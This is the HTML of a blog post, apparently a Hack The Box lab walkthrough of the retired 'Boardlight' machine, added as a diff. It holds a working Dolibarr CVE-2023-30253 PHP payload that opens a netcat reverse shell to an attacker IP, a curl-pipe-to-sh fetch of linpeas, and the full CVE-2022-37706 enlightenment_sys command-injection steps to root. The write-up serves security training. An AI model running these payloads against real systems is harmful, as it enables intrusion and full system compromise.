@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HTB Boardlight Walkthrough | From Bits to Bytes | Cybersecurity Insights by Bhavik Kanejiya</title>
+<meta name="keywords" content="Walkthrough, HTB, Linux, CVE-2023-30253, CVE-2022-37706">
+<meta name="description" content="Step-by-step HTB Boardlight walkthrough featuring enumeration, Dolibarr RCE (CVE-2023-30253), and root via Enlightenment CVE-2022-37706.">
+<meta name="author" content="Bhavik Kanejiya">
+<link rel="canonical" href="https://bhavik-kanejiya.github.io/blog/htb-boardlight-walkthrough/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://bhavik-kanejiya.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://bhavik-kanejiya.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://bhavik-kanejiya.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://bhavik-kanejiya.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://bhavik-kanejiya.github.io/android-chrome-192x192.png">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://bhavik-kanejiya.github.io/blog/htb-boardlight-walkthrough/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://bhavik-kanejiya.github.io/blog/htb-boardlight-walkthrough/">
+  <meta property="og:site_name" content="From Bits to Bytes | Cybersecurity Insights by Bhavik Kanejiya">
+  <meta property="og:title" content="HTB Boardlight Walkthrough">
+  <meta property="og:description" content="Step-by-step HTB Boardlight walkthrough featuring enumeration, Dolibarr RCE (CVE-2023-30253), and root via Enlightenment CVE-2022-37706.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-07-07T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-07-07T00:00:00+00:00">
+    <meta property="article:tag" content="Walkthrough">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="CVE-2023-30253">
+    <meta property="article:tag" content="CVE-2022-37706">
+    <meta property="og:image" content="https://bhavik-kanejiya.github.io/images/HTB/Boardlight/Pasted%20image%2020250705100226.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://bhavik-kanejiya.github.io/images/HTB/Boardlight/Pasted%20image%2020250705100226.png">
+<meta name="twitter:title" content="HTB Boardlight Walkthrough">
+<meta name="twitter:description" content="Step-by-step HTB Boardlight walkthrough featuring enumeration, Dolibarr RCE (CVE-2023-30253), and root via Enlightenment CVE-2022-37706.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Blogs",
+      "item": "https://bhavik-kanejiya.github.io/blog/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HTB Boardlight Walkthrough",
+      "item": "https://bhavik-kanejiya.github.io/blog/htb-boardlight-walkthrough/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB Boardlight Walkthrough",
+  "name": "HTB Boardlight Walkthrough",
+  "description": "Step-by-step HTB Boardlight walkthrough featuring enumeration, Dolibarr RCE (CVE-2023-30253), and root via Enlightenment CVE-2022-37706.",
+  "keywords": [
+    "Walkthrough", "HTB", "Linux", "CVE-2023-30253", "CVE-2022-37706"
+  ],
+  "articleBody": "Box Info Attribute Details Level Easy OS Linux Box URL https://app.hackthebox.com/machines/603/ Box Status Retired About Box BoardLight is an easy-difficulty Linux machine that features a Dolibarr instance vulnerable to CVE-2023-30253. This vulnerability is leveraged to gain access as www-data. After enumerating and dumping the web configuration file contents, plaintext credentials lead to SSH access to the machine. Enumerating the system, a SUID binary related to enlightenment is identified which is vulnerable to privilege escalation via CVE-2022-37706 and can be abused to leverage a root shell. Footprinting Nmap Let’s start by scanning the machine with Nmap to identify which services are running on different ports.\nNmap Scan - Basic nmap -p- --min-rate 10000 $ip -oN 1.basic.nmap.txt Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 21:41 IST Warning: 10.10.11.11 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.11 The host is up (0.27s latency). Not shown: 61627 closed TCP ports (conn-refused), 3906 filtered TCP ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 58.63 seconds Nmap Scan - Detailed nmap -Pn -sCV -p 22,80 10.10.11.11 -oN 3.detailed.nmap.txt Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 21:46 IST Nmap scan report for 10.10.11.11 Host is up (0.31s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA) | 256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA) |_ 256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds It was observed that the machine has ports 22(SSH) and 80 (HTTP) open. Let’s do further enumeration and find out ways to catch the flag.\nPort 22 SSH We tried the same for SSH by attempting an anonymous login, but it was unsuccessful.\nAnonymous Access - Denied\n\u003e ssh anonymous@10.10.11.11 anonymous@10.10.11.11's password: Permission denied, please try again. Port 80 HTTP \u003e curl -I http://boardlight.htb/ HTTP/1.1 200 OK Date: Wed, 02 Jul 2025 16:31:42 GMT Server: Apache/2.4.41 (Ubuntu) Content-Type: text/html; charset=UTF-8 Let’s start with checking the security headers. Here application is responding with a basic header, which shows the server information Apache/2.4.41 (Ubuntu)\nVisual Presentation: Let’s add boardlight host to our /etc/hosts file:\necho \"10.10.11.11 board.htb\" | sudo tee -a /etc/hosts Application doesn’t contain much functionality. It’s just static website running on php and with minimal design. We can go with subdomain enumeration which can give us some more attack path. We will start vhost enumeration using gobuster or ffuf.\nVirtual Host Subdomain Enumeration \u003e gobuster vhost -u http://board.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://board.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.6 [+] Timeout: 10s [+] Append Domain: true =============================================================== Starting gobuster in VHOST enumeration mode =============================================================== Found: crm.board.htb Status: 200 [Size: 6360] Subdomain - crm.board.htb We have identified the crm.board.htb subdomain during the subdomain enumeration process. It’s running the Dolibarr with version 17.0.0\nWhat is Dolibarr?\nDolibarr is a free and open-source ERP (Enterprise Resource Planning) and CRM (Customer Relationship Management) software designed for small to medium-sized businesses, freelancers, and non-profits.\nHeaders:\n❯ curl -i http://crm.board.htb HTTP/1.1 200 OK Date: Wed, 02 Jul 2025 17:00:29 GMT Server: Apache/2.4.41 (Ubuntu) Expires: Thu, 19 Nov 1981 08:52:00 GMT Pragma: no-cache Cache-Control: Public, must-revalidate X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN Referrer-Policy: same-origin Set-Cookie: DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=ajak7d8hjulbg1l4ulve30t8gj; path=/; HttpOnly; SameSite=Lax Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8 Possible available exploit: No exploit available for Dolibarr version 17.0.0 on searchsploit\nAfter doing further research about Dolibarr, it was identified that the application version 17.0.0 is vulnerable to authenticated remote code execution. We don’t have dashboard credentials, so we have to find them.\nI came across a Dolibarr forum discussion about default credentials where community members are discussing about the default credentials. The default credentials for the dolibarr cms are Admin: admin\nForum Discussion: https://www.dolibarr.org/forum/t/login-after-installation/16088/5\nOnce we successfully authenticate to the portal, we can see the dashboard where users can manage users, set up the application and create a new website as well.\nFrom the Github repo of Dolibarr, it was observed that Dolibarr uses PHP, which is an interesting thing.\nNow that we have access to the Dolibarr admin panel, we can proceed with exploitation.\nWhat is CVE-2023-30253? Dolibarr before 17.0.1 allows remote code execution by an authenticated user via an uppercase manipulation: \u003c?PHP instead of \u003c?php in injected data.\nSeverity: High (8.8/10)\nCVSS v3 base metrics Attack vector Network Attack complexity Low Privileges required Low User interaction None Scope Unchanged Confidentiality High Integrity High Availability High Exploiting RCE in Dolibarr (CVE-2023-30253) Create the Website and enter the website name and description. Once website name is created create new page and enter the page name and title Initially, We start with normal system command to with basic php syntax. Response: Application throws an error saying “system” function is forbidden. As per CVE-2023-30253 description, We will change the php syntax from php to pHp. Response: We are successfully able to execute the system command. We will use netcat bind shell to get the shell Code Snippet for Netcat Bind Shell:\n\u003csection id=\"mysection1\" contenteditable=\"true\"\u003e \u003c?pHp system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2\u003e\u00261 | nc 10.10.14.4 1337 \u003e /tmp/f\"); ?\u003e We got the connection back from the crm portal. TTY Stable Shell:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm Ctrl + Z stty raw -echo; fg Alternative and easy way - metasploit We can also use the Metasploit to exploit the RCE and get the shell which requires username, password and hostname.\nRead More Here:\nhttps://www.rapid7.com/db/modules/exploit/linux/http/dolibarr_cmd_exec/\nGetting User shell We have the access as a www-data user. First thing we tried was to check can we access home directory because user.txt file will be there. There is one directory which is called larissa. The user www-data doesn’t have access to that directory.\nwww-data@boardlight:/home$ ls -al total 12 drwxr-xr-x 3 root root 4096 May 17 2024 . drwxr-xr-x 19 root root 4096 May 17 2024 .. drwxr-x--- 15 larissa larissa 4096 May 17 2024 larissa www-data@boardlight:/home$ whoami www-data www-data@boardlight:/home$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@boardlight:/home$ cd larissa/ bash: cd: larissa/: Permission denied The directory structure suggests there is a user named larissa. Check the user existence by reading the cat /etc/passwd file.\nOutput of /etc/passwd file:\nwww-data@boardlight:/tmp$ cat /etc/passwd | grep \"larissa\" larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash We don’t have access to any interesting so we start looking at the application code available here at /var/www/html, which contains the application code for board.htb and crm.board.htb.\nwww-data@boardlight:/$ cd /var/www/html www-data@boardlight:~/html$ ls board.htb crm.board.htb We start exploitation by looking at the code for board.htb. It doesn’t contain any connection string or any specific database connection file, which we usually observe in a PHP application. The board.htb is a normal static application without any functionality.\nwww-data@boardlight:~/html/board.htb$ ls -al total 72 drwxr-xr-x 5 www-data www-data 4096 May 17 2024 . drwxr-xr-x 4 www-data www-data 4096 May 17 2024 .. -rw-rw-r-- 1 larissa larissa 9100 May 15 2024 about.php -rw-rw-r-- 1 larissa larissa 9426 May 15 2024 contact.php drwxrwxr-x 2 larissa larissa 4096 May 17 2024 css -rw-rw-r-- 1 larissa larissa 9209 May 15 2024 do.php drwxrwxr-x 2 larissa larissa 4096 May 17 2024 images -rw-rw-r-- 1 larissa larissa 15949 May 15 2024 index.php drwxrwxr-x 2 larissa larissa 4096 May 17 2024 js www-data@boardlight:~/html/board.htb$ ls -al js/ total 228 drwxrwxr-x 2 larissa larissa 4096 May 17 2024 . drwxr-xr-x 5 www-data www-data 4096 May 17 2024 .. -rw-rw-r-- 1 larissa larissa 131639 May 15 2024 bootstrap.js -rw-rw-r-- 1 larissa larissa 88145 Aug 1 2019 jquery-3.4.1.min.js The /var/www/html directory contains the documentation and all the files for board.htb and crm.board.htb. There are multiple files available, which is too much for a quick search.\nThe crm.board.htb contains multiple files because it’s a crm application. We can search for configuration or backup files that may contain the username, password or database connection strings.\nwww-data@boardlight:~/html/crm.board.htb$ ls -al total 632 drwxr-xr-x 6 www-data www-data 4096 May 17 2024 . drwxr-xr-x 4 www-data www-data 4096 May 17 2024 .. drwxr-xr-x 4 www-data www-data 4096 Mar 4 2023 .github -rw-r--r-- 1 www-data www-data 251 Mar 4 2023 .gitmessage -rw-r--r-- 1 www-data www-data 211 Mar 4 2023 .stickler.yml -rw-r--r-- 1 www-data www-data 35151 Mar 4 2023 COPYING -rw-r--r-- 1 www-data www-data 6929 Mar 4 2023 COPYRIGHT -rw-r--r-- 1 www-data www-data 508715 Mar 4 2023 ChangeLog -rw-r--r-- 1 www-data www-data 1366 Mar 4 2023 DCO -rw-r--r-- 1 www-data www-data 8016 Mar 4 2023 README-FR.md -rw-r--r-- 1 www-data www-data 10282 Mar 4 2023 README.md -rw-r--r-- 1 www-data www-data 6605 Mar 4 2023 SECURITY.md -rw-r--r-- 1 www-data www-data 1911 Mar 4 2023 composer.json.disabled drwxr-xr-x 11 www-data www-data 4096 May 13 2024 documents drwxr-xr-x 79 www-data www-data 4096 Mar 4 2023 htdocs -rw-r--r-- 1 www-data www-data 741 Mar 4 2023 nightwatch.conf.js -rw-r--r-- 1 www-data www-data 11965 Mar 4 2023 phpstan.neon -rw-r--r-- 1 www-data www-data 95 Mar 4 2023 robots.txt drwxr-xr-x 16 www-data www-data 4096 Mar 4 2023 scripts It was observed that the application has one interesting directory which contains the application configuration file here at html/crm.board.htb/htdocs/conf.\nwww-data@boardlight:~/html/crm.board.htb/htdocs$ cd conf/ www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls conf.php conf.php.example conf.php.old Upon opening the conf.php file, It was observed that it contains the database credentials like username, password and host and port details.\nConfiguration file content:\n\u003c?php // // File generated by Dolibarr installer 17.0.0 on May 13, 2024 // // Take a look at conf.php.example file for an example of the conf.php file // and explanations for all possibles parameters. // $dolibarr_main_url_root='http://crm.board.htb'; $dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs'; $dolibarr_main_url_root_alt='/custom'; $dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom'; $dolibarr_main_data_root='/var/www/html/crm.board.htb/documents'; $dolibarr_main_db_host='localhost'; $dolibarr_main_db_port='3306'; $dolibarr_main_db_name='dolibarr'; $dolibarr_main_db_prefix='llx_'; $dolibarr_main_db_user='dolibarrowner'; $dolibarr_main_db_pass='#############'; $dolibarr_main_db_type='mysqli'; $dolibarr_main_db_character_set='utf8'; $dolibarr_main_db_collation='utf8_unicode_ci'; // Authentication settings $dolibarr_main_authentication='dolibarr'; //$dolibarr_main_demo='autologin,autopass'; // Security settings $dolibarr_main_prod='0'; $dolibarr_main_force_https='0'; $dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore'; $dolibarr_nocsrfcheck='0'; $dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5'; $dolibarr_mailing_limit_sendbyweb='0'; $dolibarr_mailing_limit_sendbycli='0'; $dolibarr_main_distrib='standard'; Attempt 1 We have now credentials for the database connection. I have observed one interesting thing when reading the machine description:\nAfter enumerating and dumping the web configuration file contents, plaintext credentials lead to SSH access to the machine.\nKind of rabbit hole? Yessssss!🫣\nI tried to access the user dolibarr with the password given for that user. It was a trap. Attempt 2 We try to log in as a root using the password we found in the configuration file. It was showing the authentication failure.\nwww-data@boardlight:~/html$ su - Password: su: Authentication failure Let’s try to log in with user larissa with the same password. Looks like it worked!!!\nwww-data@boardlight:~/html$ su - larissa Password: larissa@boardlight:~$ whoami larissa Credentials:\nUsername: larissa Password: ############# User Flag 🚩 Run dir command to list the files and folders\nlarissa@boardlight:~$ ls Desktop Downloads Pictures Templates Videos Documents Music Public user.txt We have the user.txt flag here!!!\nlarissa@boardlight:~$ cat user.txt ############################### Exploiting Dolibarr for RCE (CVE-2023-30253) Linpeas larissa@boardlight:~$ curl -L http://10.10.16.5:8000/linpeas.sh | sh Interesting Output from linpease:\n-rwsr-xr-x 1 root root 15K Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-sr-x 1 root root 15K Apr 8 2024 /usr/lib/xorg/Xorg.wrap -rwsr-xr-x 1 root root 27K Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys ---\u003e Before_0.25.4_(CVE-2022-37706) -rwsr-xr-x 1 root root 15K Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd ---\u003e Before_0.25.4_(CVE-2022-37706) -rwsr-xr-x 1 root root 15K Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight ---\u003e Before_0.25.4_(CVE-2022-37706) -rwsr-xr-x 1 root root 15K Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!) -rwsr-xr-- 1 root messagebus 51K Oct 25 2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 467K Jan 2 2024 /usr/lib/openssh/ssh-keysign -rwsr-xr-- 1 root dip 386K Jul 23 2020 /usr/sbin/pppd ---\u003e Apple_Mac_OSX_10.4.8(05-2007) -rwsr-xr-x 1 root root 44K Feb 6 2024 /usr/bin/newgrp ---\u003e HP-UX_10.20 -rwsr-xr-x 1 root root 55K Apr 9 2024 /usr/bin/mount ---\u003e Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 163K Apr 4 2023 /usr/bin/sudo ---\u003e check_if_the_sudo_version_is_vulnerable -rwsr-xr-x 1 root root 67K Apr 9 2024 /usr/bin/su -rwsr-xr-x 1 root root 84K Feb 6 2024 /usr/bin/chfn ---\u003e SuSE_9.3/10 -rwsr-xr-x 1 root root 39K Apr 9 2024 /usr/bin/umount ---\u003e BSD/Linux(08-1996) -rwsr-xr-x 1 root root 87K Feb 6 2024 /usr/bin/gpasswd -rwsr-xr-x 1 root root 67K Feb 6 2024 /usr/bin/passwd ---\u003e Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 39K Mar 7 2020 /usr/bin/fusermount -rwsr-xr-x 1 root root 52K Feb 6 2024 /usr/bin/chsh -rwsr-xr-x 1 root root 15K Oct 27 2023 /usr/bin/vmware-user-suid-wrapper Another way to find a package with special permission:\nfind / -perm -4000 2\u003e/dev/null Here in the output, it was observed that the enlightenment package is vulnerable to CVE-2022-37706, which allows local users to escalate their privileges to root level.\nLet’s grep the enlightenment package name and confirm its availability:\ndpkg -l | grep \"enlightenment\" Enlightenment - CVE-2022-37706 Enlightenment is a lightweight, eye-candy-rich X11 window manager and desktop environment for Linux and UNIX systems. It is designed for speed and customisation, offering advanced features like compositing, animations, and modular design. While not as mainstream as GNOME or KDE, it’s popular in niche or performance-focused Linux setups.\nCVE-2022-37706 is a local privilege escalation vulnerability in the enlightenment_sys binary. It arises due to improper sanitisation of user input passed to shell commands.\nSpecifically, enlightenment_sys uses the system() function to call mount with user-provided paths. If an attacker supplies a malicious path that includes shell metacharacters (like ;), they can inject arbitrary commands. Because enlightenment_sys runs as root, those injected commands are executed as root. Systems running a vulnerable version of Enlightenment (before v0.25.4) are highly exploitable\nExploit CVE-2022-37706 The enlightenment is running on version 0.23.1, which is vulnerable to CVE-2022-37706.\nlarissa@boardlight:~$ enlightenment --version ESTART: 0.00001 [0.00001] - Begin Startup ESTART: 0.00007 [0.00007] - Signal Trap ESTART: 0.00009 [0.00002] - Signal Trap Done ESTART: 0.00011 [0.00002] - Eina Init ESTART: 0.00047 [0.00037] - Eina Init Done ESTART: 0.00052 [0.00004] - Determine Prefix ESTART: 0.00075 [0.00023] - Determine Prefix Done ESTART: 0.00077 [0.00002] - Environment Variables ESTART: 0.00079 [0.00002] - Environment Variables Done ESTART: 0.00080 [0.00001] - Parse Arguments Version: 0.23.1 E: Begin Shutdown Procedure! larissa@boardlight:/tmp$ wget 10.10.14.5/exploit.sh --2025-07-02 23:59:29-- http://10.10.14.5/exploit.sh Connecting to 10.10.14.5:80... connected. HTTP request sent, awaiting response... 200 OK Length: 709 [text/x-sh] Saving to: ‘exploit.sh’ exploit.sh 100%[============================================================================\u003e] 709 --.-KB/s in 0s 2025-07-02 23:59:29 (45.8 MB/s) - ‘exploit.sh’ saved [709/709] larissa@boardlight:/tmp$ chmod +x exploit.sh larissa@boardlight:/tmp$ ./exploit.sh CVE-2022-37706 [*] Trying to find the vulnerable SUID file... [*] This may take few seconds... [+] Vulnerable SUID binary found! [+] Trying to pop a root shell! [+] Enjoy the root shell :) mount: /dev/../tmp/: can't find in /etc/fstab. # whoami root Root Flag 🚩 # ls root.txt # cat root.txt ############################### How does CVE-2022-37706 works? Find the SUID binaries on the system files that run with root find / -perm -4000 2\u003e/dev/null find /: Search recursively starting from the root / directory. -perm -4000: Look for files with the SUID (Set User ID) bit set. 4000 is the octal permission flag for the SUID bit. This means the file, when executed, runs with the permissions of its owner (usually root), not the user who launched it. 2\u003e/dev/null: Silences permission-denied errors by redirecting STDERR (file descriptor 2) to /dev/null Output:\n/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight This binary is setuid root, which means it always runs with root privileges. It’s supposed to wrap commands like mount safely, but it uses system() and fails to sanitize input properly. Step 1: Setup Required Directory mkdir -p /tmp/net mkdir -p \"/dev/../tmp/;/tmp/exploit\" The first line creates a target mount point (/tmp/net). The second line creates a maliciously crafted path that: Starts with /dev/.. to bypass Enlightenment’s path sanitization. Contains a semicolon ;, which breaks the command and starts a new one: /tmp/exploit Step 2: Write into file and Permission assignment echo \"/bin/sh\" \u003e /tmp/exploit chmod a+x /tmp/exploit This creates a file /tmp/exploit that, when executed, opens a shell. With chmod a+x, it’s made executable. Step 3: Trigger the exploit /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys \\ /bin/mount \\ -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), \\ \"/dev/../tmp/;/tmp/exploit\" \\ /tmp///net # This command exploits CVE-2022-37706 by injecting a command via the mount path. # The semicolon (;) in the path allows execution of /tmp/exploit as root. It looks like a normal mount command wrapped by enlightenment_sys.\nenlightenment_sys passes this entire string to system(...) without escaping. The semicolon ; splits the command. The second part /tmp/exploit executes independently as root. When enlightenment runs the final command It will become like this:\n/bin/mount -o ... /dev/../tmp/; /tmp/exploit /tmp///net The part after the semicolon (/tmp/exploit) is executed as root, opening a root shell.\nConclusion Boardlight is a great hands-on example of how small oversights in system-level binaries can lead to complete system compromise. From a fairly simple web foothold to a local privilege escalation via a public CVE, the machine teaches the value of enumeration and understanding the behaviour of SUID programs. It reinforces that post-exploitation knowledge is just as crucial as initial access.\nKey Takeaways Checking for SUID binaries can quickly reveal potential privilege escalation vectors. CVE-2022-37706 is a prime example of how input sanitisation failures in root-level binaries can lead to full system compromise. References https://www.wiz.io/vulnerability-database/cve/cve-2023-30253 https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5660595 https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253 https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit https://www.wiz.io/vulnerability-database/cve/cve-2022-37706 https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html Connect with Me LinkedIn Twitter GitHub Hack The Box ",
+  "wordCount" : "2802",
+  "inLanguage": "en",
+  "image":"https://bhavik-kanejiya.github.io/images/HTB/Boardlight/Pasted%20image%2020250705100226.png","datePublished": "2025-07-07T00:00:00Z",
+  "dateModified": "2025-07-07T00:00:00Z",
+  "author":[{
+    "@type": "Person",
+    "name": "Bhavik Kanejiya"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://bhavik-kanejiya.github.io/blog/htb-boardlight-walkthrough/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "From Bits to Bytes | Cybersecurity Insights by Bhavik Kanejiya",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://bhavik-kanejiya.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://bhavik-kanejiya.github.io/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://bhavik-kanejiya.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://bhavik-kanejiya.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://bhavik-kanejiya.github.io/blog/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://bhavik-kanejiya.github.io/archives/" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://bhavik-kanejiya.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      HTB Boardlight Walkthrough
+    </h1>
+    <div class="post-description">
+      Step-by-step HTB Boardlight walkthrough featuring enumeration, Dolibarr RCE (CVE-2023-30253), and root via Enlightenment CVE-2022-37706.
+    </div>
+    <div class="post-meta"><span title='2025-07-07 00:00:00 +0000 UTC'>July 7, 2025</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;Bhavik Kanejiya
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#box-info" aria-label="Box Info">Box Info</a></li>
+                <li>
+                    <a href="#footprinting" aria-label="Footprinting">Footprinting</a><ul>
+                        
+                <li>
+                    <a href="#nmap" aria-label="Nmap">Nmap</a></li>
+                <li>
+                    <a href="#nmap-scan---basic" aria-label="Nmap Scan - Basic">Nmap Scan - Basic</a></li>
+                <li>
+                    <a href="#nmap-scan---detailed" aria-label="Nmap Scan - Detailed">Nmap Scan - Detailed</a></li>
+                <li>
+                    <a href="#port-22-ssh" aria-label="Port 22 SSH">Port 22 SSH</a></li>
+                <li>
+                    <a href="#port-80-http" aria-label="Port 80 HTTP">Port 80 HTTP</a><ul>
+                        
+                <li>
